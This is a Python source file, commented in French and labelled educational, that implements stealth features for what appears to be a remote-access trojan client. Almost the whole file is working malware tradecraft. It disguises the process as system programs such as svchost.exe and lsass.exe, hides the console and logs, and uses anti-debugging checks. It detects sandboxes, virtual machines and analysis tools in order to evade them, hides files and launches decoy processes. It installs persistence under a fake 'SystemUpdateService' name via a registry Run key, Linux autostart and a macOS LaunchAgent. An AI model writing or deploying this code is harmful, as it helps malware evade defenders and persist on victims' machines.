"""
Client Stealth - Fonctionnalités de mode furtif
Techniques pour rendre le client moins détectable
⚠️ USAGE ÉDUCATIF UNIQUEMENT ⚠️
"""

import os
import sys
import time
import random
import platform
import subprocess
from pathlib import Path
from typing import Dict, Any, List, Optional
import logging

logger = logging.getLogger(__name__)

class StealthManager:
    """Gestionnaire des fonctionnalités furtives"""
    
    def __init__(self):
        self.system = platform.system().lower()
        self.stealth_active = False
        self.original_argv = sys.argv.copy()
        self.hidden_files = []
        
        # Noms de processus légitimes par OS
        self.legitimate_names = {
            'windows': [
                'svchost.exe', 'dwm.exe', 'explorer.exe', 'winlogon.exe',
                'csrss.exe', 'lsass.exe', 'spoolsv.exe', 'taskhost.exe'
            ],
            'linux': [
                'systemd', 'kthreadd', 'dbus-daemon', 'NetworkManager',
                'systemd-logind', 'gdm3', 'gnome-shell', 'pulseaudio'
            ],
            'darwin': [
                'launchd', 'kernel_task', 'WindowServer', 'Dock',
                'Finder', 'loginwindow', 'SystemUIServer', 'syslogd'
            ]
        }
        
        logger.debug("StealthManager initialisé")
    
    def activate_stealth_mode(self) -> Dict[str, Any]:
        """Active le mode furtif complet"""
        try:
            results = {
                'stealth_activated': True,
                'techniques_applied': [],
                'warnings': []
            }
            
            # Masquage du processus
            if self.hide_process():
                results['techniques_applied'].append('Process hiding')
            else:
                results['warnings'].append('Échec masquage processus')
            
            # Modification des arguments
            if self.modify_process_args():
                results['techniques_applied'].append('Arguments modification')
            
            # Désactivation des logs
            if self.disable_logging():
                results['techniques_applied'].append('Logging disabled')
            
            # Anti-debugging basique
            if self.apply_anti_debugging():
                results['techniques_applied'].append('Anti-debugging')
            
            # Vérifications d'environnement
            env_checks = self.check_environment()
            if env_checks['suspicious']:
                results['warnings'].extend(env_checks['indicators'])
            
            self.stealth_active = True
            
            return results
            
        except Exception as e:
            logger.error(f"Erreur activation mode furtif: {e}")
            return {
                'stealth_activated': False,
                'error': str(e)
            }
    
    def hide_process(self) -> bool:
        """Masque le processus courant"""
        try:
            if self.system == 'windows':
                return self._hide_process_windows()
            elif self.system == 'linux':
                return self._hide_process_linux()
            elif self.system == 'darwin':
                return self._hide_process_macos()
            else:
                return False
                
        except Exception as e:
            logger.error(f"Erreur masquage processus: {e}")
            return False
    
    def _hide_process_windows(self) -> bool:
        """Masquage de processus Windows"""
        try:
            # Changement du nom de processus affiché
            legitimate_name = random.choice(self.legitimate_names['windows'])
            
            # Tentative de modification du nom via ctypes (limité)
            try:
                import ctypes
                from ctypes import wintypes
                
                # Modification du titre de la console
                ctypes.windll.kernel32.SetConsoleTitleW(legitimate_name[:-4])  # Sans .exe
                
                # Masquage de la fenêtre console
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                if console_window:
                    ctypes.windll.user32.ShowWindow(console_window, 0)  # SW_HIDE
                
                return True
                
            except Exception as e:
                logger.debug(f"Masquage Windows limité: {e}")
                return False
                
        except Exception:
            return False
    
    def _hide_process_linux(self) -> bool:
        """Masquage de processus Linux"""
        try:
            # Modification du nom de processus visible
            legitimate_name = random.choice(self.legitimate_names['linux'])
            
            # Tentative de modification via prctl (si disponible)
            try:
                import ctypes
                libc = ctypes.CDLL("libc.so.6")
                
                # PR_SET_NAME = 15
                result = libc.prctl(15, legitimate_name.encode(), 0, 0, 0)
                return result == 0
                
            except Exception:
                # Méthode alternative: modification argv[0]
                try:
                    sys.argv[0] = legitimate_name
                    return True
                except Exception:
                    return False
                    
        except Exception:
            return False
    
    def _hide_process_macos(self) -> bool:
        """Masquage de processus macOS"""
        try:
            # Modification du nom de processus
            legitimate_name = random.choice(self.legitimate_names['darwin'])
            
            try:
                # Tentative de modification via setproctitle si disponible
                sys.argv[0] = legitimate_name
                return True
            except Exception:
                return False
                
        except Exception:
            return False
    
    def modify_process_args(self) -> bool:
        """Modifie les arguments du processus"""
        try:
            # Nettoyage des arguments suspects
            clean_args = []
            
            for arg in sys.argv:
                # Suppression des arguments suspects
                if any(suspect in arg.lower() for suspect in ['rat', 'hack', 'exploit', 'backdoor']):
                    continue
                clean_args.append(arg)
            
            # Ajout d'arguments légitimes factices
            legitimate_args = [
                '--service', '--daemon', '--background',
                '--update', '--maintenance', '--system'
            ]
            
            clean_args.extend(random.sample(legitimate_args, 2))
            sys.argv = clean_args
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur modification arguments: {e}")
            return False
    
    def disable_logging(self) -> bool:
        """Désactive le logging pour être plus discret"""
        try:
            # Désactivation du logging root
            logging.getLogger().disabled = True
            
            # Redirection des sorties vers /dev/null
            if hasattr(os, 'devnull'):
                devnull = open(os.devnull, 'w')
                sys.stdout = devnull
                sys.stderr = devnull
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur désactivation logging: {e}")
            return False
    
    def apply_anti_debugging(self) -> bool:
        """Applique des techniques anti-debugging basiques"""
        try:
            techniques_applied = 0
            
            # Vérification de debugger (Windows)
            if self.system == 'windows':
                try:
                    import ctypes
                    if ctypes.windll.kernel32.IsDebuggerPresent():
                        # Comportement anti-debug: exit silencieux
                        os._exit(0)
                    techniques_applied += 1
                except:
                    pass
            
            # Vérification de ptrace (Linux/macOS)
            elif self.system in ['linux', 'darwin']:
                try:
                    import ctypes
                    libc = ctypes.CDLL("libc.so.6" if self.system == 'linux' else "libc.dylib")
                    
                    # PTRACE_TRACEME = 0
                    if libc.ptrace(0, 0, 0, 0) == -1:
                        # Possiblement sous debug
                        time.sleep(random.uniform(1, 3))  # Délai anti-analyse
                    
                    techniques_applied += 1
                except:
                    pass
            
            # Vérification de l'environnement d'exécution
            if self._detect_analysis_environment():
                # Comportement évasif
                time.sleep(random.uniform(5, 15))
                techniques_applied += 1
            
            return techniques_applied > 0
            
        except Exception as e:
            logger.error(f"Erreur anti-debugging: {e}")
            return False
    
    def _detect_analysis_environment(self) -> bool:
        """Détecte les environnements d'analyse"""
        try:
            suspicious_indicators = 0
            
            # Vérification des outils d'analyse
            analysis_tools = [
                'wireshark', 'tcpdump', 'procmon', 'processmonitor',
                'ollydbg', 'x64dbg', 'ida', 'ghidra', 'radare2',
                'vmware', 'virtualbox', 'qemu', 'sandboxie'
            ]
            
            # Vérification des processus en cours
            try:
                if self.system == 'windows':
                    result = subprocess.run(['tasklist'], capture_output=True, text=True)
                    running_processes = result.stdout.lower()
                else:
                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                    running_processes = result.stdout.lower()
                
                for tool in analysis_tools:
                    if tool in running_processes:
                        suspicious_indicators += 1
                        
            except Exception:
                pass
            
            # Vérification des variables d'environnement
            suspicious_env_vars = [
                'SANDBOX', 'MALWARE', 'ANALYSIS', 'DEBUG',
                'VMWARE', 'VBOX', 'QEMU'
            ]
            
            for var in suspicious_env_vars:
                if var in os.environ:
                    suspicious_indicators += 1
            
            # Vérification des noms d'utilisateur suspects
            suspicious_users = [
                'analyst', 'malware', 'sandbox', 'test',
                'admin', 'user', 'honeypot'
            ]
            
            current_user = os.environ.get('USER', os.environ.get('USERNAME', '')).lower()
            if current_user in suspicious_users:
                suspicious_indicators += 1
            
            return suspicious_indicators >= 2
            
        except Exception:
            return False
    
    def check_environment(self) -> Dict[str, Any]:
        """Vérifie l'environnement d'exécution"""
        try:
            checks = {
                'suspicious': False,
                'indicators': [],
                'vm_detected': False,
                'analysis_tools': False,
                'sandbox_indicators': 0
            }
            
            # Détection de machine virtuelle
            vm_indicators = [
                ('hostname', ['sandbox', 'malware', 'virus', 'analysis']),
                ('username', ['analyst', 'test', 'sandbox', 'admin']),
                ('system', ['vmware', 'virtualbox', 'qemu', 'xen'])
            ]
            
            hostname = platform.node().lower()
            username = os.environ.get('USER', os.environ.get('USERNAME', '')).lower()
            system_info = platform.platform().lower()
            
            for check_type, indicators in vm_indicators:
                if check_type == 'hostname':
                    target = hostname
                elif check_type == 'username':
                    target = username
                else:
                    target = system_info
                
                for indicator in indicators:
                    if indicator in target:
                        checks['indicators'].append(f"Suspicious {check_type}: {indicator}")
                        checks['sandbox_indicators'] += 1
            
            # Vérification des ressources système (VMs ont souvent peu de ressources)
            try:
                import psutil
                
                # Mémoire faible (< 2GB)
                memory_gb = psutil.virtual_memory().total / (1024**3)
                if memory_gb < 2:
                    checks['indicators'].append("Low memory (potential VM)")
                    checks['sandbox_indicators'] += 1
                
                # Peu de cœurs CPU
                if psutil.cpu_count() <= 2:
                    checks['indicators'].append("Low CPU count (potential VM)")
                    checks['sandbox_indicators'] += 1
                    
            except ImportError:
                pass
            
            # Vérification de la durée d'activité (sandboxes redémarrent souvent)
            try:
                if self.system == 'windows':
                    result = subprocess.run(['systeminfo'], capture_output=True, text=True)
                    if 'Boot Time' in result.stdout:
                        # Analyse basique de l'uptime
                        checks['indicators'].append("System info analyzed")
                elif self.system == 'linux':
                    with open('/proc/uptime', 'r') as f:
                        uptime = float(f.read().split()[0])
                        if uptime < 3600:  # Moins d'1 heure
                            checks['indicators'].append("Low uptime (potential sandbox)")
                            checks['sandbox_indicators'] += 1
            except Exception:
                pass
            
            # Détermination si l'environnement est suspect
            checks['suspicious'] = checks['sandbox_indicators'] >= 3
            checks['vm_detected'] = any('vm' in ind.lower() or 'virtual' in ind.lower() 
                                       for ind in checks['indicators'])
            
            return checks
            
        except Exception as e:
            logger.error(f"Erreur vérification environnement: {e}")
            return {'suspicious': False, 'error': str(e)}
    
    def hide_files(self, file_paths: List[str] = None) -> Dict[str, Any]:
        """Masque des fichiers sur le système"""
        try:
            if not file_paths:
                file_paths = [sys.executable]  # Masquer l'exécutable courant
            
            results = {
                'files_hidden': 0,
                'methods_used': [],
                'errors': []
            }
            
            for file_path in file_paths:
                try:
                    if self.system == 'windows':
                        success = self._hide_file_windows(file_path)
                    else:
                        success = self._hide_file_unix(file_path)
                    
                    if success:
                        results['files_hidden'] += 1
                        self.hidden_files.append(file_path)
                    
                except Exception as e:
                    results['errors'].append(f"{file_path}: {str(e)}")
            
            return results
            
        except Exception as e:
            logger.error(f"Erreur masquage fichiers: {e}")
            return {'error': str(e)}
    
    def _hide_file_windows(self, file_path: str) -> bool:
        """Masque un fichier sur Windows"""
        try:
            import ctypes
            
            # Ajout de l'attribut caché
            FILE_ATTRIBUTE_HIDDEN = 0x02
            FILE_ATTRIBUTE_SYSTEM = 0x04
            
            result = ctypes.windll.kernel32.SetFileAttributesW(
                file_path, 
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
            )
            
            return result != 0
            
        except Exception:
            return False
    
    def _hide_file_unix(self, file_path: str) -> bool:
        """Masque un fichier sur Unix (préfixe point)"""
        try:
            file_path_obj = Path(file_path)
            
            if not file_path_obj.name.startswith('.'):
                hidden_path = file_path_obj.parent / f".{file_path_obj.name}"
                file_path_obj.rename(hidden_path)
                return True
            
            return True  # Déjà caché
            
        except Exception:
            return False
    
    def create_decoy_processes(self) -> Dict[str, Any]:
        """Crée des processus leurres pour masquer l'activité"""
        try:
            decoys = {
                'processes_created': 0,
                'decoy_pids': [],
                'errors': []
            }
            
            # Commandes légitimes qui consomment peu de ressources
            legitimate_commands = {
                'windows': [
                    ['ping', 'localhost', '-t'],
                    ['timeout', '3600'],  # Sleep pour 1 heure
                    ['powershell', '-Command', 'Start-Sleep 3600']
                ],
                'linux': [
                    ['sleep', '3600'],
                    ['ping', 'localhost'],
                    ['tail', '-f', '/dev/null']
                ],
                'darwin': [
                    ['sleep', '3600'],
                    ['ping', 'localhost'],
                    ['tail', '-f', '/dev/null']
                ]
            }
            
            commands = legitimate_commands.get(self.system, [])
            
            for cmd in commands[:3]:  # Maximum 3 processus leurres
                try:
                    process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL
                    )
                    
                    decoys['processes_created'] += 1
                    decoys['decoy_pids'].append(process.pid)
                    
                except Exception as e:
                    decoys['errors'].append(f"Command {' '.join(cmd)}: {str(e)}")
            
            return decoys
            
        except Exception as e:
            logger.error(f"Erreur création leurres: {e}")
            return {'error': str(e)}
    
    def cleanup_stealth(self) -> Dict[str, Any]:
        """Nettoie les traces du mode furtif"""
        try:
            cleanup_results = {
                'files_restored': 0,
                'processes_terminated': 0,
                'settings_restored': 0
            }
            
            # Restauration des fichiers cachés
            for file_path in self.hidden_files:
                try:
                    if self.system == 'windows':
                        import ctypes
                        FILE_ATTRIBUTE_NORMAL = 0x80
                        ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_NORMAL)
                    else:
                        # Suppression du préfixe point si ajouté
                        path_obj = Path(file_path)
                        if path_obj.name.startswith('.') and path_obj.exists():
                            new_name = path_obj.name[1:]  # Supprime le point
                            path_obj.rename(path_obj.parent / new_name)
                    
                    cleanup_results['files_restored'] += 1
                    
                except Exception:
                    pass
            
            # Restauration des arguments
            sys.argv = self.original_argv
            cleanup_results['settings_restored'] += 1
            
            # Réactivation du logging
            logging.getLogger().disabled = False
            
            self.stealth_active = False
            self.hidden_files.clear()
            
            return cleanup_results
            
        except Exception as e:
            logger.error(f"Erreur nettoyage furtif: {e}")
            return {'error': str(e)}
    
    def get_stealth_status(self) -> Dict[str, Any]:
        """Retourne le statut du mode furtif"""
        try:
            return {
                'stealth_active': self.stealth_active,
                'system': self.system,
                'hidden_files_count': len(self.hidden_files),
                'process_modified': sys.argv != self.original_argv,
                'logging_disabled': logging.getLogger().disabled,
                'environment_checks': self.check_environment()
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def simulate_legitimate_activity(self) -> bool:
        """Simule une activité légitime pour masquer le comportement"""
        try:
            # Accès à des ressources légitimes
            legitimate_activities = [
                lambda: subprocess.run(['ping', '-c', '1', 'google.com'], 
                                     capture_output=True),
                lambda: time.sleep(random.uniform(0.5, 2.0)),
                lambda: os.listdir('.'),  # Activité fichier normale
                lambda: platform.platform()  # Requête système normale
            ]
            
            # Exécution aléatoire d'activités
            for _ in range(random.randint(2, 5)):
                activity = random.choice(legitimate_activities)
                try:
                    activity()
                    time.sleep(random.uniform(0.1, 0.5))
                except Exception:
                    pass
            
            return True
            
        except Exception:
            return False

def enable_stealth_mode() -> Dict[str, Any]:
    """Active le mode furtif global"""
    try:
        stealth = StealthManager()
        return stealth.activate_stealth_mode()
    except Exception as e:
        return {'error': str(e), 'stealth_activated': False}

def check_stealth_environment() -> Dict[str, Any]:
    """Vérifie si l'environnement est propice au mode furtif"""
    try:
        stealth = StealthManager()
        return stealth.check_environment()
    except Exception as e:
        return {'error': str(e)}

def create_persistence(install_path: str, autostart: bool = False) -> Dict[str, Any]:
    """
    Crée la persistance du client (éducatif)
    
    Args:
        install_path: Chemin d'installation
        autostart: Activer le démarrage automatique
        
    Returns:
        Dict: Résultats de l'installation
    """
    try:
        results = {
            'persistence_created': False,
            'methods_used': [],
            'warnings': []
        }
        
        system = platform.system().lower()
        
        if system == 'windows' and autostart:
            # Ajout au registre (nécessite des privilèges)
            try:
                import winreg
                
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                
                app_name = "SystemUpdateService"  # Nom légitime
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, install_path)
                winreg.CloseKey(key)
                
                results['methods_used'].append('Windows Registry')
                results['persistence_created'] = True
                
            except Exception as e:
                results['warnings'].append(f'Registry method failed: {e}')
        
        elif system in ['linux', 'darwin'] and autostart:
            # Création d'un service/démon
            try:
                home = os.path.expanduser('~')
                
                if system == 'linux':
                    # Autostart desktop file
                    autostart_dir = os.path.join(home, '.config', 'autostart')
                    os.makedirs(autostart_dir, exist_ok=True)
                    
                    desktop_file = os.path.join(autostart_dir, 'system-update.desktop')
                    with open(desktop_file, 'w') as f:
                        f.write(f"""[Desktop Entry]
Type=Application
Name=System Update Service
Exec={install_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
                    
                    results['methods_used'].append('Linux Autostart')
                    results['persistence_created'] = True
                
                elif system == 'darwin':
                    # LaunchAgent plist
                    launch_agents_dir = os.path.join(home, 'Library', 'LaunchAgents')
                    os.makedirs(launch_agents_dir, exist_ok=True)
                    
                    plist_file = os.path.join(launch_agents_dir, 'com.system.update.plist')
                    with open(plist_file, 'w') as f:
                        f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{install_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
""")
                    
                    results['methods_used'].append('macOS LaunchAgent')
                    results['persistence_created'] = True
                    
            except Exception as e:
                results['warnings'].append(f'Autostart method failed: {e}')
        
        # Copie du fichier vers le chemin d'installation
        try:
            install_dir = os.path.dirname(install_path)
            os.makedirs(install_dir, exist_ok=True)
            
            # Copie de l'exécutable courant
            import shutil
            shutil.copy2(sys.executable, install_path)
            
            results['methods_used'].append('File installation')
            
        except Exception as e:
            results['warnings'].append(f'File installation failed: {e}')
        
        return results
        
    except Exception as e:
        return {
            'persistence_created': False,
            'error': str(e)
        }